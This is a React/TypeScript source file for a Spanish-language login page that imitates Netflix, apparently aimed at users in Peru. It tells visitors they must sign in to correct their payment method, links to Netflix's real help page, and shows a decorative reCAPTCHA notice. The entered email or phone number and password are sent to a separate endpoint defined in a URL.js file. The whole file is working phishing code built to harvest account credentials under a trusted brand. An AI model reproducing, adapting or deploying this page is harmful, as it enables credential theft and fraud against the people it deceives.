import React, { useState, useEffect, FormEvent } from "react";
import styles from './login.module.css';
import URLEnvio from "./URL.js";
import peruFlag from './peruflag.png'; // Asegúrate de tener la imagen en tu proyecto

interface LoginProps {
    onLoginSuccess: () => void;
}

const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
    const [emailOrPhone, setEmailOrPhone] = useState<string>("");
    const [password, setPassword] = useState<string>("");
    const [errorMessage, setErrorMessage] = useState<string>("");
    const isPhone = emailOrPhone.startsWith("+51"); // Detectar si es un número de teléfono

    useEffect(() => {
        if (/^\d+$/.test(emailOrPhone) && !emailOrPhone.startsWith("+51")) {
            setEmailOrPhone("+51 " + emailOrPhone);
        }
    }, [emailOrPhone]);

    const validateInput = async (e: FormEvent) => {
        e.preventDefault();

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\+51 \d{9}$/;  // Formato obligatorio +51 XXXXXXXX

        if (emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone)) {
            setErrorMessage("");

            const data = {
                name: emailOrPhone,
                password: password
            };

            try {
                const response = await fetch(`${URLEnvio}/api/enviar`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });

                const result = await response.json();
                if (response.status === 201) {
                    onLoginSuccess();
                } else {
                    setErrorMessage(result.message);
                }
            } catch (error) {
                setErrorMessage("Hubo un error al enviar los datos.");
            }
        } else {
            setErrorMessage("Ingrese un correo válido o un número de teléfono con formato +51 XXXXXXXX.");
        }
    };

    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        let value = e.target.value.replace(/\s+/g, ""); // Eliminar espacios en blanco

        if (/^\d+$/.test(value) || value.startsWith("+51")) {
            if (!value.startsWith("+51")) {
                value = "+51 " + value; // Agregar +51 si no está presente
            }

            const digitsOnly = value.replace(/\D/g, "").substring(2, 11); // Obtener solo los dígitos después de "+51"
            setEmailOrPhone("+51 " + digitsOnly); // Limitar a 9 dígitos
        } else {
            setEmailOrPhone(value); // Permitir correos electrónicos
        }
    };

    return (
        <div className={styles.conteinerTotal}>
            <div className={styles.PCELMDPDIS}>
                <p>Para corregir el método de pago debe iniciar sesión</p>
            </div>
            <div className={styles.conteinerLogin}>
                <div className={styles.divH2}>
                    <h2>Inicia sesión</h2>
                </div>
                <form onSubmit={validateInput} className={styles.conteinerLoginForm}>
                    <div className={styles.inputContainer}>
                        {isPhone && (
                            <img src={peruFlag} alt="Bandera de Perú" className={styles.flag} />
                        )}
                        <input
                            type="text"
                            placeholder="Email o número de celular"
                            value={emailOrPhone}
                            required
                            onChange={handleInputChange}
                        />
                    </div>
                    {errorMessage && (
                        <p className={styles.errorMessage}>{errorMessage}</p>
                    )}
                    <input
                        type="password"
                        placeholder="Contraseña"
                        value={password}
                        required
                        onChange={(e) => setPassword(e.target.value)}
                    />
                    <button type="submit">Iniciar sesión</button>
                    <div className={styles.centrado}>
                        <div className={styles.conteinerRecuerdame}>
                            <input type="checkbox" id="Recuerdame" />
                            <p>Recuérdame</p>
                        </div>
                        <a href="https://www.netflix.com/LoginHelp" className={styles.olvidaste}>
                            ¿Olvidaste la contraseña?
                        </a>
                    </div>
                </form>
                <div className={styles.text}>
                    <button type="button">
                        Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
                    </button>
                </div>
            </div>
        </div>
    );
};

export default Login;
